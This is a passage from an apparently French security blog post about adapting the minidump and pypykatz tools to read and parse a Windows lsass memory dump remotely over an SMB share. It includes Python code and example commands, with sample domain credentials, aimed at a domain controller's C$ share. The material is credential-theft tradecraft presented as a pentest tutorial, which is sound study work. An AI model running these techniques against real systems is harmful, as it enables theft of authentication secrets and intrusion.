        &lt;span class=&quot;n&quot;&gt;pattern&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;re&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;compile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;r&quot;^(?P&amp;lt;domainName&amp;gt;[a-zA-Z0-9.-_]+)/(?P&amp;lt;userName&amp;gt;[^:]+):(?P&amp;lt;password&amp;gt;[^@]+)@(?P&amp;lt;hostName&amp;gt;[a-zA-Z0-9.-]+):/(?P&amp;lt;shareName&amp;gt;[^/]+)(?P&amp;lt;filePath&amp;gt;/(?:[^/]*/)*[^/]+)$&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;matches&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pattern&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;matches&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;raise&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;{} is not valid. Expected format : domain/username:password@host:/share/path/to/file&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;matches&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        

    &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;
    Ouverture du fichier distant
    &quot;&quot;&quot;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__enter__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__fid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__conn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;openFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__tid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__fpath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;

    &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;
    Fermeture de la connexion
    &quot;&quot;&quot;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__exit__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exc_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exc_val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exc_tb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__conn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    
    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__conn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

    &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;
    Lecture de @size octets
    &quot;&quot;&quot;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__conn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__tid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__fid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__currentOffset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;

    &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;
    Déplacement du pointer d'offset
    &quot;&quot;&quot;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;seek&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;whence&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;whence&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__currentOffset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;

    &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;
    Retourne l'offset actuel
    &quot;&quot;&quot;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;tell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__currentOffset&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nous avons donc notre nouvelle classe qui s’authentifie sur un partage réseau, et peut lire un fichier distant avec les méthodes citées. Si nous indiquons à minidump d’utiliser cette classe au lieu de la méthode &lt;code class=&quot;highlighter-rouge&quot;&gt;open&lt;/code&gt; classique, alors minidump va lire le contenu distant sans sourciller.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/11/minidump_patched.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/11/minidump_patched.png&quot; alt=&quot;Remote Minidump&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;minidump adsec.local/jsnow:Winter_is_coming_\!@DC01.adsec.local:/C$/Windows/Temp/lsass.dmp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Et de la même manière, pypykatz utilisant minidump, il pourra analyser le dump distant sans le télécharger complètement.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/11/pypykatz_patched.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/11/pypykatz_patched.png&quot; alt=&quot;Remote Pypykatz&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pypykatz lsa minidump adsec.local/jsnow:Winter_is_coming_\!@DC01.adsec.local:/C$/Windows/Temp/lsass.dmp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;optimisations&quot;&gt;Optimisations&lt;/h3&gt;

&lt;p&gt;Nous avons maintenant un moyen de lire et analyser un dump lsass à distance, sans avoir à télécharger les 150Mo de dump sur notre machine, c’est une belle avancée ! Cependant, même si nous ne devons pas tout télécharger, le dump prend beaucoup de temps, presqu’autant que le téléchargement. Cela est dû au fait qu’à chaque fois que minidump veut lire quelques octets, une nouvelle requête est effectuée vers le serveur distant. C’est très couteux en temps, et en ajoutant un peu de log, on se rend compte que minidump fait beaucoup, beaucoup de demandes de 4 octets.&lt;/p&gt;

&lt;p&gt;Une solution que j’ai mise en place pour pallier ce problème est de créer un buffer local, et imposer un nombre minimal d’octets à lire lors d’une requête pour réduire l’overhead. Si une requête demande moins de 4096 octets, et bien nous demanderons quand même 4096 octets, que nous sauvegarderons en local, et nous ne reverrons que les 4 premiers.&lt;/p&gt;

&lt;p&gt;Lors des appels suivant à la fonction &lt;code class=&quot;highlighter-rouge&quot;&gt;read&lt;/code&gt;, si la taille de données demandée est dans le buffer local, on renvoie directement le buffer local, ce qui est bien plus rapide. Si en revanche la donnée n’est pas dans le buffer, alors un nouveau buffer de 4096 octets sera demandé.&lt;/p&gt;

&lt;p&gt;Cette optimisation fonctionne très bien car minidump effectue beaucoup de lectures concomitantes. Voici comment elle a été mise en place.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;
    On envoie une chaine vide si la taille est 0
    &quot;&quot;&quot;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;

    
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__buffer_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;offset&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__currentOffset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__buffer_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;offset&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__buffer_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;size&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
            &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__buffer_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;offset&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__buffer_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;size&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__currentOffset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;
        Si les octets demandés sont inclus dans le buffer local self.__buffer_data[&quot;buffer&quot;], on renvoie directement la valeur
        &quot;&quot;&quot;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__buffer_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;buffer&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__currentOffset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__buffer_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;offset&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]:&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__currentOffset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__buffer_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;offset&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;
        Sinon, on demande le buffer au fichier distant
        &quot;&quot;&quot;&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__buffer_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;offset&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__currentOffset&lt;/span&gt;

        &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;
        Si la demande est inférieure à self.__buffer_min_size octets, on prendra quand même self.__buffer_min_size octets
        Et on stockera le surplus pour les prochains appels.
        &quot;&quot;&quot;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__buffer_min_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__conn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__tid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__fid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__currentOffset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__buffer_min_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__buffer_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;size&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__buffer_min_size&lt;/span&gt;
            &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__total_read&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__buffer_min_size&lt;/span&gt;
            
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__conn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__tid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__fid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__currentOffset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__buffer_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;size&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;
            &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__total_read&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;
        
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__buffer_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;buffer&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;

    &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__currentOffset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;
    On ne renvoie que ce qui est nécessaire
    &quot;&quot;&quot;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Cette optimisation permet de drastiquement gagner du temps. Voici un benchmark fait sur ma machine :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python no_opti.py
Function=minidump, Time=39.831733942

$python opti.py
Function=minidump, Time=0.897719860077
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Sans cette optimisation, le script prenait environ 40 secondes, tandis qu’avec l’optimisation, il prend moins d’une seconde. Moins d’une seconde pour extraire les secrets d’authentification d’un dump lsass distant de plus de 150Mo !&lt;/p&gt;

&lt;h2 id=&quot;module-crackmapexec&quot;&gt;Module CrackMapExec&lt;/h2&gt;

